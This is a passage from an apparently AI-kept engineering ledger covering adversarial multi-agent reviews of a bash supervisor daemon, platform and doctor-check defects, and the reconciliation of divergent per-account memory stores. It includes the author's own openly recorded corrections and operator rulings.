IT CARRIED IS LIFTED" — written at merge time, 39 minutes before the deploy made it true. It is correct
now by timing rather than by construction, and the line stays.

**Standing rule: a comment asserting a deploy-gated fact is unfalsifiable from inside the tree.** No
test, no scan and no reviewer with the whole repo in front of them can tell whether it holds, because
the fact it claims does not live in the repo — which is the same blind spot as the misattribution class,
approached from the other side. The mechanism-shaped version names the GATE ("lifted once the fleet runs
this sha") rather than the outcome, because a gate is checkable and an outcome is not.

## D-TBD-mv-symlink-dir — `_plat_mv_notdir`'s darwin arm, from an outside session

`claude-OpenClawHetzner` (mail 320, working on an unrelated branch) found that `_plat_mv_notdir`'s
darwin arm mishandles one destination shape. Confirmed on GNU coreutils 9.4 — `mv -f -- src dest` with
`dest` a symlink TO A DIRECTORY returns **0** with `dest` still the symlink and `src` moved INSIDE it.
The function's stated contract is `# <src> <dest> -> 0 iff <src> is now at <dest>`; on that shape the
darwin arm returns 0 with its own postcondition false. Measured across all five shapes, it is **exactly
one shape wide**: symlink-to-file, dangling symlink and plain file all replace correctly, and a plain
directory is caught by the guard's `return 1`.

Three things make it more than a platform nit:

- **The guard's exception and the command's blind spot are the same set.** The header calls `-L` before
  `-d` "the whole correctness of the Darwin arm", enumerating two outcomes for a symlink-to-dir dest —
  `-T` replaces it, `[ -d ]` would wrongly refuse it — and the code performs a **third** that neither
  branch contemplates. `! -L` is the only path by which a destination `-d` calls a directory reaches a
  bare `mv -f`.
- **The test has never run.** `macos-platform.test.ts:391` is `describe.skipIf(!IS_DARWIN)` and the
  `_plat_mv_notdir` case is inside it. Measured on the fleet box: **38 passed, 10 SKIPPED.** Adding a
  symlink case there would add a comment, not a mechanism. Both arms are pure bash and CAN be pinned in
  a suite that runs on linux, by driving `CCD_OS=darwin` after sourcing the platform block.
- **The fix removes a bet rather than placing one.** Today's arm is correct only if BSD `mv` does not
  follow a symlink to a directory, which nobody has measured. After `rm -f` the destination does not
  exist, and no `mv` can move into a thing that is not there — so "unverified on darwin" is the argument
  FOR the fix, not a reason to wait for a mac.

### The sixth instance of the misattribution class, and this one is mine

The atomicity paragraph above the function says *"every destination is `$REG/<id>.<field>`, and this
function is its only writer — so the race is unreachable here rather than tolerated."* Measured against
`origin/main`, **four of the five call sites are outside `$REG`**: `$plist` (`:552`), `$_LC_DIR/errors`
(`:2496`), `$_sl_file` (`:13953`), and **`$POOLS_DIR/$project` (`:5926`) — which wave 2a added.** We
added a call site and left the sentence standing. The conclusion survives (nothing in the tree creates a
*directory* at any of those paths, so the race stays unreachable); the argument that proves it does not.

Found by an outside session looking at something else. Fifty-four review agents found none of the four
instances in wave 2b, and none of them would have found this one either: a reviewer checks whether a
claim is true of the code in front of them and never opens the call sites the claim quantifies over.

**Disposition: its own small ccd PR, queued BEHIND R1–R5 and D-2000. Not a pools wave item** — wave 3's
Global Constraint forbids any file under `ccd/`, wave 4 is PWA, wave 5 is docs. Both boxes are linux, so
the darwin arm is inert here and **cost and benefit of shipping it today are both about zero** — the
both-sides inertness test from the entry above, applied deliberately this time. No number is minted yet:
a `D-N` is DEFINED in a plan, and one written into this ledger without a plan definition raises
`deviation-refs.test.ts`'s tree scan without raising its plan scan, reddening the suite.

### A near miss worth recording

I began this measurement reading `ccd/ccd` from my own worktree and citing line numbers from it. My
branch is a docs-only branch that has never merged `origin/main`, so its `ccd/ccd` was **pre-C1, 1,528
lines behind** — the platform block happened to be byte-identical, but every call-site line number I had
written down was wrong. Caught only because `grep -n '^_reg_read'` came back empty on a function I had
just read in the deployed file. **Standing rule: a coordinator citing source in a report anchors to
`origin/main` explicitly, never to its own checkout** — the branch a coordinator sits on is the one tree
in the fleet with no reason to be current.

### Why I "invented" that rule — measured, and it was structural

The error I booked on 2026-09-08 as *"an exhaustive measurement with a wrong inference drawn from it"*
has a better explanation than the one I gave it. I searched for a rule, found nothing across three
searches, concluded I had invented it, and the worker refuted me by citing `account-pools-program.md:19`
in project memory. I recorded the lesson as *"a negative search proves what it SEARCHED"* and moved on.

Measured now, per-project memory under `projects/-mnt-HC-Volume-105751470-projects-ccrc-pwa/memory/`:

    ~/.claude          29 files
    ~/.claude-corp     15 files
    ~/.claude-dev0      9 files
    ~/.claude-expoai    0 files   <- this coordinator's root

Fleet sessions run under at least **four `CLAUDE_CONFIG_DIR` roots, each with its own per-project
memory, and those memories have diverged** — the three surviving copies of `account-pools-program.md`
carry three different md5s, and 27 files exist under `~/.claude` that do not exist under
`~/.claude-corp`, including every standing rule written for this program.

So neither of us was wrong about what we could see. From this session's root the project memory is
genuinely, entirely empty, and my search was exhaustive over the only root I have. The lesson I wrote
was true but soft. **The hard version: the artifacts that steer sessions are not shared between
sessions at all.** A rule written to memory by the coordinator reaches no worker; a rule a worker cites
may be invisible to the coordinator; and a program that relies on either is relying on a coincidence of
config roots.

**Standing rule: the git-tracked ledger and ccrc mail are the only surfaces a fleet program may treat
as shared.** This ledger has been "mine alone to write" as a matter of ownership hygiene; it is now
load-bearing for a second reason — it is the one thing every session can actually read. Anything that
must steer a peer goes here or in mail, never in memory.

Not fixed unilaterally, deliberately: reconciling four divergent stores means writing into three roots
this session does not own, and one of the memories under `~/.claude` is named
`ccrc-never-writes-files-it-does-not-own.md` — which this coordinator cannot read from its own root,
and whose filename alone settles the question. Flagged to the operator as an ops decision.

## 2026-09-09 — PR #69 reviewed: 7 MAJOR, 10 MINOR, and the misattribution class finally CAUGHT

Five lenses on opus over the C1 follow-up (`fix/c1-rescue-lane`, `8ea4d108`), each finding then handed
to a separate sonnet refute pass whose only job was to kill it. **38 refute passes: 29 CONFIRMED, 9
PARTLY, ZERO REFUTED.** Suites at the tip are green and ten mutations were measured red by the author,
which is exactly why the review had to be adversarial rather than confirmatory to find anything.

### The result that matters for how this program reviews ccd

**Four of the five lenses independently found the same misattribution** — `ccd/ccd:12610-12611` claims
`.stranded` "IS a surface — the server reads it onto the phone (`SessionRecord.stranded`)", and on both
`origin/main` and the PR branch `SessionRecord` has 22 fields and no `stranded`, with no reader anywhere
in `server/src`, `agent/src`, `shared/` or `pwa/src`. It exists only on the author's own unmerged
branch.

Set that against wave 2b: **fifty-four review agents found NONE of four instances.** The only
difference is that this time one lens was told the class by name and given a single explicit job —
open every document, line number and command a comment cites and check it says what the comment claims.
That lens found seven citation defects; three other lenses tripped over the same big one on their way
to something else.

**Standing rule: every ccd review carries a prose-vs-code lens whose job is to open the citations.**
Not "review carefully" — a named lens with a named class and an instruction to run the greps the
comments quote. It is one agent out of five and it found the finding four ways.

### The shape of what came back

The headline is that **the PR's own thesis is unapplied three lines below its own fix.** It splits
"stay put" from "cannot decide" for the crossing record and leaves the identical fold on the POOL TAG
in the same function (`[[ "$prc" -eq 2 ]] && return 0`) — where a hard-blocked pane with an unreadable
tag gets NO rescue even when a healthy in-pool candidate exists, and the caller then writes "no account
in pool (untagged) can take it", the exact fabricated sentence the new arm one seam up exists to
forbid. And the asymmetry that sets the priority: the crossing record is inert on the box, the pool tag
is the live one.

Two more are defects the fix INTRODUCED rather than inherited: a strand the tick can set but never
clear (`_strand_clear` is unreachable from that branch — I proved this myself with a failing case before
the review returned), and a new unguarded `_reg_get` inside the supervise loop — the precise hang class
the same commit added `[[ -f "$f" ]]` to close. That last one is worth stating plainly: **a fix and its
own regression shipped in one commit, in the same function, against the same class.**

### Two operational lessons, both mine

**Never point review subagents at the coordinator's own worktree.** I gave five agents this
coordinator's own worktree path and told them "review only, do not modify". One
checked out `pr69` in it, and the session resumed with the coordinator sitting on the wrong branch —
`ws/amber-summit` was intact and pushed, so nothing was lost, but nothing about that was by design. A
verifier's own notes recorded the tree "drifted mid-session from `pr69` to `ws/amber-summit` with stray
untracked files I did not create", which is the same event seen from the other side. **Read-only is an
instruction, not a mechanism.** Give reviewers their own detached worktree, or a `git archive` export;
several agents did exactly that on their own initiative and their evidence is the evidence I trust
most.

**The mail BODY cap is 8192 bytes**, alongside the 200-byte subject cap already recorded. Learned by
413 on a 10,549-byte review. The right shape is a tight ranked body plus the full detail as an ABSOLUTE
-path artifact, which is what shipped — every verdict and its reproduction in the artifact, the ranking
and the argument in the body.

## 2026-09-09 — round 2 verified: three defects introduced, and an S7 arc worth three entries

Seven lenses on opus over `74a50164`, 45 findings, each handed to a sonnet skeptic told to kill it:
**30 CONFIRMED, 14 PARTLY, 1 REFUTED.** 52 agents. I re-derived the top three myself before relaying,
and one changed shape when I did.

### The headline is live, and it is the ordinary row

The round's own new pool-undecidable arm **defeats the debounce D-1995 exists for.** `_tick_decided`
(`:12745`) removes `$REG/<id>.tickstuck`; the new `_tick_undecidable "$id" pool` (`:12853`) debounces on
that file's presence. On a row whose pool tag is undecidable but whose crossing read decided, every
tick clears the stamp and re-writes it: **720 swap.log lines and 720 registry write-cycles per hour per
row**, into an unrotated file, firing on a HEALTHY quiet pane.

Three lenses found it. What I added by checking reachability myself is that it is worse than they
said: `_crosspool_tick`'s first line is `[[ -e "$REG/$id.crosspool" || -L … ]] || return 1`, so on any
row with **no crossing marker — every row on the box — `ctrc` is 1 and the `else` branch runs.** This is
not a double fault. It is the ordinary row plus one bad tag, and one bad tag on a shared project storms
every session on that project.

And the comment three lines above it — *"this is the only place that has all three answers, so the
stamp is set and cleared here rather than inside the reads (D-1995)"* — is falsified by the same
commit's new setter 108 lines below. **The sentence naming the invariant and the line breaking it
shipped together.**

### The S7 arc — three layers, and each layer was right to exist

1. I filed S7: an un-debounced `tmux capture-pane` per tick. Every mechanical claim true.
2. The worker refuted it by **widening the measurement boundary from the function to the loop** —
   `_auto_compact_check` runs in the same tick line and already captures on such a row. I confirmed that
   premise myself and accepted the refutation.
3. The verification round measured D-2162 and found **the refuting measurement is itself false for five
   of seven trip shapes.** "10 -> 20, not 0 -> 10" holds only when the WHOLE registry is unreadable; when
   `.wrapper` alone is broken — the round's own listed trip shape — `lastcompact`/`lastswap` read fine,
   the compact lane returns at its 1800s cooldown with no capture, and the new lane's capture is the
   tick's only one. 0 -> 1.

**And S7 stays refuted anyway, on a ground nobody had stated:** the control case measures a HEALTHY row
at 2 captures per tick, so an affected row never rises above the ordinary per-row cost. That closes it
far more cleanly than the doubling claim.

**Standing rule: a refutation is a claim and gets measured like any other.** I accepted layer 2 after
verifying its premise and stopped there — the premise was true and the inference from it was not, which
is this program's oldest failure shape and I walked into it while checking someone else's version of it.
The entry that closes a finding is the one nobody re-reads; it earns the most scrutiny, not the least.
This round's own D-2032 says "a count is a measurement or it is decoration" — and the entry written to
close the round was decoration.

### The pattern, now four rounds long

**#67 introduced two defects, round 1 introduced two (S2, S3), round 2 introduced three (the storm, a
constraint-lift, an unmutated guard).** That is not a competence problem — it is the standing cost of a
dense change in a 5-second hot loop, and *every one of them was caught by measurement rather than by
reading*. The mutation table and the adversarial lens are the only two things in this program that have
ever caught this class. Neither is optional, and the count going up is evidence they work, not evidence
they don't.

Two more worth keeping: **D-2157's hang class is not closed** — `_authdead` still cats blind on the tick
path at `:1098`, reached at `:12616`, and the file is `$REG/<account>-authdead`, not `$REG/<id>.<field>`,
so `_reg_get`'s new guard does not cover it; no ccd code writes that path, which makes it exactly the
un-owned file the safety argument assumes is safe, and a FIFO there wedges the tick for EVERY row that
reaches the candidate loop. And **S3 traded a loud failure for a silent one**: a `.project` that is a
FIFO used to wedge the supervisor visibly and now reads as untagged, which relocates across pools with
no strand and no line — the constraint-lifting class arrived at from the other direction. The remedy is
the measured reader at that site, not reverting the guard.

## D-TBD-doctor-models-timer — the ccd queue takes a third item, and the instance was smaller than the rule

`claude-OpenClawHetzner` (mail 327) reported that `ccd/ccrc-doctor-checks`'s `_check_services` builds
`installed` from a hardcoded five-unit `known` list (`:809` on `origin/main`), so the `ccrc-models.timer`
their Plan 1 installs would never be asked about — and doctor's PASS line, whose own comment promises
*"a box that answers 'PASS services' cannot be a box where the check quietly measured one unit"*, would
silently omit it. All four of their claims confirmed by measurement.

**Two things measurement added that the report did not have.**

**The ordering they proposed is unnecessary, and backwards.** They offered it as a gate item behind
their PR. But `installed` membership is gated on the unit FILE existing
(`[ -f "$dir/$(_dr_unit_file "$u")" ]`), so naming a not-yet-installed unit is inert. Measured on a
scratch worktree of main: **350 passed | 3 skipped, before and after.** So it ships independently of
their PR — and it *should* ship first, because the failure it closes is SILENT and appears the moment
their installer runs. A check for a thing should exist before the thing does.

**And that same measurement says the one-liner would ship UNPINNED.** 350 pass with and without, which
by this repo's doctrine makes it a request, not a mechanism. It is one line PLUS the fixture, never the
line alone. Worth stating because the instinct on a "just add it to the list" fix is to skip the test,
and I have spent this week booking other people's unpinned guards.

**The rule was bigger than the instance.** Measuring every unit `ccrc` installs against every unit
doctor asks about found two more outside `known` — `ccd-graph-sweep.timer` and `ccrc-ddns.timer` — both
deliberately, because this file already runs **two designs**: ask systemd whether the unit runs
(`known`), or measure the artifact the unit produces including its freshness (graph-sweep's census via
`_plat_mtime`; ddns's actual DNS record). The models timer has neither, which is the true shape of the
finding — not "the list went stale" but "a unit landed and neither design was extended to it". A `known`
entry cannot see a timer that fires and produces nothing, which for a catalogue is the failure that
bites. Recommended both, `known` first, and asked them for the catalogue's freshness contract since
they own its semantics rather than me.

**Queue, in order:** D-2000 (gates wave 3's SERVER deploy) → #69 round 3 (a LIVE log storm) →
D-TBD-mv-symlink-dir → D-TBD-doctor-models-timer. No numbers minted for the two TBDs: a `D-N` is DEFINED
in a plan, and one written into this ledger without a plan definition raises `deviation-refs.test.ts`'s
tree scan without raising its plan scan.

## 2026-09-09 — the ccd queue gets a plan and a workspace, and memory follows the ACCOUNT

**Operator ruling:** spawn a workspace for the two ccd queue items once #69 merges, and reconcile
project memory across the fleet, consulting every running session first.

### The ccd queue is now a plan, not two TBDs

`docs/superpowers/plans/2026-09-09-ccd-queue-platform-shim-and-doctor-coverage.md`, defining
**D-2187–D-2193** (minted in one call, floor 2194, defined in the same act). Part A is
`_plat_mv_notdir`'s Darwin arm; Part B is `_check_services`' unit coverage. Base is `origin/main` AFTER
#69 merges — neither part touches a file #69 touches, so they are independent of that merge, but one
tree is one tree.

The plan is deliberately shaped so the smaller half is not the easier half: **B2 comes before B1**,
because adding `ccrc-models.timer` to `known` is a MEASURED no-op against the current suite (350 passed
| 3 skipped, before and after), so the one-liner without its fixture is a request rather than a
mechanism. `deviation-refs` caught the plan while it was untracked — the tree scan could not see the
numbers the plan scan could, which is the publish-then-sweep discipline doing exactly its job.

### Memory follows the ACCOUNT — and there are FIVE roots, not four

Correcting my own entry from yesterday, which said four. `CLAUDE_CONFIG_DIR` is set **by the wrapper**,
so the memory store is keyed on the ACCOUNT:

    claude -> ~/.claude 30 | claude-corp -> ~/.claude-corp 15 | claude-dev0 -> ~/.claude-dev0 10
    claude-expoai -> ~/.claude-expoai 7 | claude2 -> ~/.claude-personal 6

The root I missed is `~/.claude-personal` — **the one this program's WORKER runs on.** An enumeration
that looked exhaustive over the wrong set, again, and this time I had already written the lesson down.

59 distinct filenames. **54 exist in exactly one root**; only 3 names diverge in content (`MEMORY.md`,
which is a per-root index and is supposed to; `account-pools-program.md`, three versions;
`graph-sweep-exit-code-is-a-claim.md`, two). So the problem was never "the stores disagree" — they
barely overlap enough to disagree. It is that 54 facts are each invisible to four fifths of the fleet.

Two facts that sharpen it:

- **`account-pools-program.md` exists in `.claude`, `.claude-corp` and `.claude-dev0` — and in neither
  root this program actually runs on.** Neither its coordinator nor its worker can read the memory file
  about their own program. That is the whole explanation for the "invented rule" incident.
- **The two largest stores belong to accounts with no running `ccrc-pwa` session.** `~/.claude` (30) and
  `~/.claude-corp` (15) are reachable only by `soft-harbor` and `calm-mesa`, both stopped. Most of this
  project's accumulated memory is invisible to every live session right now.

**And the structural one, which this program owns: auto-swap moves a session between accounts, so it
moves the session between memory stores.** A rescued session silently changes which project memory it
can see. Nothing shipped is at fault — it falls out of memory being keyed on the config dir — but
"write it to memory so the next session sees it" has never been true across a swap, and this program's
entire purpose is moving sessions between accounts.

Method: all five stores backed up first; consult mailed to all five running `ccrc-pwa` sessions asking
whether any file of theirs is wrong, whether they are writing memory now, and whether they object;
**union, never overwrite**; a memory measurement has since falsified is DROPPED rather than copied into
five places; the three divergent files merged on content with every drop evidenced.

## 2026-09-09 — memory reconciled across five roots, and the delete verdicts were half wrong

All five roots now hold the same 59 memories plus a regenerated index, verified byte-identical (one md5
over every filename and its content, equal in all five). 226 files written; all five stores backed up
first, after the one peer who was mid-write.

### The result that changes how this is done next time

A classification pass marked 10 of 54 orphaned memories STALE. A separate completeness critic
re-measured all ten and found **five of those verdicts WRONG** — every one sharing a single failure
mode: it read the memory's point-in-time STATUS HEADER, found it superseded, and condemned the whole
file, where each was the sole surviving record of measured facts that still verify. **A 50% error rate
on the delete direction settles the policy: propagate and correct, never prune, in a pass like this.**
Nothing was deleted. Pruning stays with whoever owns the file.

**Standing rule: a status header going stale is not the file going stale.** The cheap read is the
header; the expensive one is the body, and the body is where the measurements live.

### Seven false claims caught BEFORE propagation, each of which would have shipped five times

The sharpest: `ccrc-api-curl-free-client.md` said **"17 rows, not 18"**. Measured, `ROUTES` has 18 and
`ccrc-api.test.ts:237` asserts 18 — and that suite's own comment at `:224` records a past stale
`toHaveLength(17)` as the exact bug it exists to catch. **Propagating that memory would have reinstalled
the defect its own test suite was written to prevent.** Two independent agents caught the same stale row
count in two different files.

Also corrected: a "still say five" that main says six; `/api/claims/:id/break` as the "third" ungated
door where the pinned set has four; an embargo recorded as holding when it lifted (and "closed" would
have been wrong the other way — the scoping fix is still in flight); a `watch.ts` path off by a
directory and 16 lines; and a sentence about CLAUDE.md's grep guidance that CLAUDE.md no longer carries
— flagged **independently by its own author and by the critic**, which is the strongest signal in the
batch.

**And one of mine.** `per-root-memory-is-not-shared.md`, written the day before, carried a four-root
census with per-root file counts. Copying it into five roots would have changed every number in it — a
file whose entire subject is staleness, made stale by the act of sharing it. Rewritten to carry the
wrapper→root MAPPING and an explicit re-measure command, and no counts at all.

### The gap nothing recorded: a live push-blocker

Two memories described the pre-push hook and **both were wrong** — one said `origin` was never
redirected and the public repo was a second remote; the other said it refuses every non-main ref
categorically. **Both were also marked stale**, so a pruning pass would have left the fleet with no
record of a mechanism that blocks pushes today. Measured: v3, gates on the remote URL (so it fires on
every push to `origin`, not only `main`), `origin` IS the public repo, and it refuses on CONTENT —
identity residue — with `CCRC_ALLOW_PUBLIC_PUSH=1` as the override. It refused a ledger commit of mine
the day before for an absolute worktree path in prose. Now recorded.

**Two wrong accounts of one mechanism, both condemned, is how a fact disappears from a fleet** — not by
anyone deleting the truth, but by every surviving copy of it being wrong at once.

### Confirmed independently by a peer, and it widens the finding

`claude-ccrc-pwa` measured that **`tasks/` follows the config dir exactly as memory does** — its task
files diverged across two roots after a swap, the post-swap root holding the older snapshot. A second
artifact class, same mechanism. So this is not a memory bug: **it is what keying anything on
`CLAUDE_CONFIG_DIR` costs when a session's account can change under it**, which is precisely what this
program automates.

### Left undone, deliberately

Eleven methodology memories from these review rounds all say a version of *measure the claim you are
actually making*. Propagated whole that is 55 copies of one overlapping cluster. Consolidating them is a
judgment call about the fleet's doctrine, not a cleanup, so it goes to the operator rather than being
taken unilaterally.

### The open question closed, by a peer, with a measurement I should have taken

I left one judgment call for the operator: eleven methodology memories from these review rounds all say
a version of *measure the claim you are actually making*, and propagated whole that is "55 copies of an
overlapping cluster". `claude-ccrc-pwa` answered it better than I framed it, and the measurement settles
it:

    MEMORY.md                 60 lines, 14,258 bytes   <- what loads every session
    the methodology cluster   11 lines,  2,688 bytes   = 19% of the index

**File copies cost nothing — they are not loaded. The index is what loads.** So consolidating eleven
files into one saves ~2.4 KB of per-session index and destroys eleven distinct pieces of evidence. Their
argument for why that trade is bad: each memory records its own instance — a file, a line, a wrong
number — and **the instance is what makes the rule land on recall; a merged file keeps the rule and
loses the evidence.**

**I measured the store when the cost lives in the index.** That is `measure-the-loop-not-the-function`
applied at the wrong boundary, by the session that wrote that memory two hours earlier — the cluster
defended itself against the coordinator proposing to compress it.

**Disposition: keep all eleven, do not rewrite.** If the index ever needs to shrink, the shape the peer
named — one index line pointing at a cluster file that `[[name]]` links the eleven, bodies untouched —
is additive, reversible, and any session can do it later. Not doing it now: 19% of 14 KB is not worth
spending evidence on.

Union re-verified after the peer's own post-merge write (they stamped one file in all five roots,
byte-identical): five roots, one md5, 60 files each. **The union survived its first concurrent write,
which is the property that actually matters** — reconciliation that decays on the next write would have
bought nothing.

---

## 2026-09-09 14:2x — the memory union was NOT byte-identical when I said it was (peer mail 355 → my 356)

**Correcting my own paragraph above.** The sentence "five roots, one md5, 60 files each — the union
survived its first concurrent write" is FALSE, and I am pointing at it rather than editing it away.
Measured 33 minutes after the sweep applied: four roots held 60 files, one held **61**.

The extra file is a project memory another session wrote at 12:09:32Z. My sweep APPLIED at 13:40:30Z.
So the file existed before the write and after the ENUMERATION — the file union carried the list I had
built, while the index regenerator read each root's real directory. That is why one root's `MEMORY.md`
came out 275 bytes longer **at the same timestamp as the other four**: two halves of one sweep
disagreed, and the disagreement was the only symptom. Nothing failed. Nothing warned.

**The rule, recorded as `a-sweep-reports-the-list-not-the-result`:** an enumerate-then-apply sweep
reports the PRE-state, because the natural report is composed from the input list — the one artefact
guaranteed to be stale. Never report a sweep's outcome from its input; re-measure the post-state and
report that. And where two halves of a sweep can disagree (a union over a list, an index over a
directory), that disagreement is the cheapest detector available — look for it on purpose.

Repaired and re-measured from the post-state: five roots, **62 files each, `differing=0 extra=0`**.

**What the peer session `ccrc-pwa-brisk-cove` is shipping, and why my pass was the manual version of
it.** Branch `ws/project-scoped-memory` (local, 4/5 tasks reviewed green, D-2238..D-2252): a
SessionStart hook that converges a `(home, project)` pair, `ccrc memory` as a read-only census,
`ccrc memory --apply` to union every root's `memory/` into ONE store under `~/.ccrc/memory/<slug>/` and
symlink each root at it, and a `ccrc doctor` check reporting forked and unreachable as DIFFERENT
failures because the remedies differ. **Do not run `--apply` — it is not deployed and still under
review.** Their point stands and mine did not: a snapshot has a half-life; the mechanism does not.

**What I measured that they did not have.** Their mail named "the two `.claude-corp` symlinks"; there
are **eight**, six in one root and two in another, across six projects — and every one points at the
`.claude` root, not at `~/.ccrc`. That root is already an informal hub for six projects, two of them
three-home clusters. I chased the order-dependency before reporting it: if the hub converges first the
other links resolve THROUGH it to the store, so absorb runs with `src == store`, every `dest` is the
file itself, `cmp -s` takes the identical arm, and the pass is a no-op; if a symlinked root converges
first, `readlink -f` lands on the hub's real directory and absorbs the real data. Both orders safe —
so this is a census correction, not a finding, and their inference survives my false premise intact.
That symmetry is `a-refutation-is-a-claim` turned on my own evidence: wrong premise, right conclusion,
and only the premise gets retracted.

Also measured: the two homes they flagged as outside the roster are not alike — one carries 38 projects
and a real memory store, the other carries **zero** entries under `projects/`. Both still pass the
census's own gate (an empty directory satisfies `[ -d ]`), so they are outside the ROSTER, not outside
the enumeration — which is their own unreachable-vs-forked split, and it holds. And the five-root
figure for this project is confirmed independently: exactly five homes hold a `ccrc-pwa` memory store.

**One finding sent back, INERT today:** the index builder returns silently on a memory file with no
`name:` frontmatter, so the file survives on disk and vanishes from the index — and the index is the
artefact actually loaded into context. That is the absorber's own "the bytes were never lost, only
unmentioned" argument one layer up, and the index builder has no counter. 0 of 62 files hit it today:
the same inert-until-it-isn't class the three ccd queue items are built from. Left as their call.

**Operational consequence for this program:** that was the last manual reconciliation round. Once
`--apply` deploys, memory is written to one root and converges. And the eleven-memory consolidation
question I was going to put to the operator mostly dissolves at one store per project — worth saying
before they rule on a problem about to stop existing.

**PR #69 unchanged through all of this:** head `be16dbf3`, MERGEABLE, five checks SUCCESS, last pushed
12:46:30Z. The worker is closing B2–B5; I re-review only the delta. Nothing about the memory exchange
touches the merge gate.

**Correction to the rule I stated one section above (peer mail 357 → my 358).** I wrote the remedy as
"re-measure the post-state and report THAT". That is not sufficient, and `ccrc-pwa-brisk-cove` said so
within the hour: my corrected number (five roots, 62 files, `differing=0 extra=0`) is a quote by the
time anyone reads it, exactly as the wrong one was. **The defect was never "I reported the pre-state" —
it is that any number about a mutable world is a measurement carrying a timestamp, and measuring more
carefully does not fix it. Measure at the POINT OF USE.** That is why their verb splits into a read-only
census and an `--apply` at all: the artefact you read before acting must be produced by a run that
changes nothing. Their correction also names the class better than my write-up did — *an artefact that
reports what it INTENDED is not evidence of what it DID*, which is this repo's "a comment is a request,
a red suite is a mechanism" stated for a migration rather than a test, and is where their two Critical
data-loss fixes came from.

One property of their design I verified against my own bug and sent back, because a reviewer could
otherwise read it as cosmetic: my two halves could disagree because the union ran over a LIST while the
index regenerator read a DIRECTORY. Their `_mem_rebuild_index` globs the STORE — the destination, after
absorb — so it can never list a file the union did not place. The failure I shipped is structurally
unavailable there.

Memory `a-sweep-reports-the-list-not-the-result` rewritten to carry the sharpened rule, not the first
one; five roots re-verified identical at 62 files after the rewrite.

---

## 2026-09-09 17:5x — PR #69 round 4 gated: ONE MORE ROUND (worker mail 359 → my 363)

Head `c3e69b41`, MERGEABLE, CI green on server/agent/pwa/build-pwa. Review: 7 lenses on opus over
`be16dbf3..c3e69b41`, one adversarial refute pass on sonnet per finding. **35 agents, 0 errors, 28
findings raised, 7 refuted, 21 survived — collapsing to about 11 distinct defects.** Report:
`pr69-round4-gate.md` (mail 363's artifact).

**Verdict: one more round. Nothing BLOCKING, nothing dangerous.** But every MAJOR is one shape, and it
is this PR's own shape — *a guard ships without a mechanism, or a comment claims a mechanism that does
not exist*. Two I measured myself rather than forwarding, one with a control:

- **`ccd/ccd:13123`** — B2's `swapblocked` half. Replaced the `_tick_decided` clear with `:`: **62 test
  files / 1749 passed, fully GREEN.** Line `13109` ends the paragraph two lines above with "Pinned in
  both directions." And because `_swap_refuse` DELETES `.lastswap` and stamps `.swapblocked`, the
  unpinned half is the one that carries the refusal case for the whole cooldown.
- **`ccd/ccd:16203`** — `cmd_prefer`'s `! _pool_untaggable`. Dropped: **GREEN**. Dropped the
  byte-identical text at `15941` (`cmd_swap`): **RED**. Same guard, one verb measured and one not.
  **The control is what turns this from "nothing covers this area" into a finding** — and it is the
  general lesson: a green mutation proves nothing until an identical mutation somewhere else reds.

Two more confirmed by reading: `12829-12835`'s "ONE MAPPING … cannot drift apart" is false, because
`_tick_strand_undecidable:15841` builds its own sentence and never goes through `_undecidable_cause` —
and its call sites are the EARLY-RETURN paths, so the *common* case is the one naming no file. And B3
has a THIRD verb reader at `14421` (`cmd_start`/`cmd_enable`) still folding `.project` through
`_reg_get`, where `""` → `untagged` → `_pool_ok` 0 silences both the die and the out-of-pool warn.

**I corrected my own lens, and it went the worker's way.** The rc-seam lens filed the `$stuck` branch
as a REGRESSION — "the base commit named the right one". Base `13123-13135` stamped `crosspool` at
`13065` and then wrote its sentence from a DIFFERENT ladder (hrc/prc, never ctrc) at `13132`,
unconditionally: base named BOTH, which is D-2255 itself. **Head is better than base in that fixture;
it is not a regression.** What survives is real and smaller — the headline "WHICH undecidable — READ,
not inferred" holds only on the `$stuck`-empty path. *A reviewer can measure correctly and still
over-reach on the inference, and comparing one of two surfaces is how.* Same rule as
`a-refutation-is-a-claim`, pointed at a finding instead of a refutation.

**Ruling given on the worker's open question — `[pool=-]` goes to its OWN PR, numbered before merge.**
`_project_pool_state` has a clean four-word contract; of its **eleven** consumers, **ten** distinguish
properly and `_strand_mark:15351` is the only fold. Worse than filed: on the no-cause branch the banner
contradicts itself inside one sentence, because `_strand_why:15283` already emits `tag:unreadable` into
the same line. Why not this PR: B3 earned its place because it is a constraint LIFT; this is a REPORTING
defect — the placement is right, only the sentence is wrong. Different class, plus the banner is pinned
VERBATIM by `ccd-auto-swap-pool.test.ts` and the fix carries a small design. **A follow-up that is not
numbered before the merge does not exist.**

**The worker's suite figure was about a different tree.** They reported server 273/7397; the PR head is
277/7739. 273 is exactly `ws/clear-meadow`'s count — missing 9 files the head has (#71's models work),
carrying 5 the head does not (unmerged wave-4 pool tests), based on `644aea41` (#68) one commit behind
main, and neither PR commit is its ancestor. `ccd/ccd` byte-identity is necessary and not sufficient:
**a suite result is about a TREE, not a file.** No practical risk — I ran all 277 on the head myself
and CI agrees. I checked the "65 file" ccd sweep before calling it a second discrepancy and did NOT
report it: the `ccd-*` set is identical at 61 on both branches, so that figure is a wider glob I do not
know. *Two count discrepancies with the same cause is a finding; one with an unknown cause is a guess.*

Verified clean and independent of the worker: blob `568bd947` identical on both branches; exactly one
`ccrc:generated` marker at line 2, verifying; platform block `11-757` sha `e7f0696d` byte-identical to
`ccd/ccrc` with the delta's lowest change at `12511`; agent 293 and pwa 2192+typecheck matching exactly.
And the core of B5 is right: one call site, `-ge 2`, a `*` arm that says `rc$strc` loudly, and a cause
renderer that names an unknown word rather than inventing a sentence for it.

**Asked for before I clear the merge:** pin `13123` or delete the "Pinned in both directions" sentence;
pin `16203` against `15941`'s template. Items 3-6 (close or number `14421`, fix the ONE MAPPING comment,
the five-item misattribution cluster, book `[pool=-]`) are wanted but not gating.

**Correction to "INERT today" above (peer mail 361 → my 364).** I sent the `_mem_index_line` silent-drop
as a finding and wrote here that it fires on nothing today — *"0 of 62 files hit it"*. **It is not
inert, and it was ruled into their fix wave, not left as their call.** Fleet-wide there are 6 hits
across 808 memory files. I measured the corpus I HAD, not the corpus the function HAS: that function
serves every project on the box, and I reported a shared utility's blast radius from my own project's
slice. Same error as the `capture-pane` severity two days earlier, one boundary out — recorded by
rewriting `measure-the-loop-not-the-function` to carry both instances rather than filing a near-duplicate.

**Their wider number is wrong the other way, and I proved it by inode.** The 6 are TWO distinct files
seen three times: dev 2064 inode 12484572 at three paths, because `.claude-corp` and `.claude-personal`
reach that project's `memory/` through two of the eight symlinks I catalogued for them. After `--apply`
converges, two index lines are lost, not six. The general property is worth more than the number:
**a census that walks containers and dereferences links counts one item once per container that can see
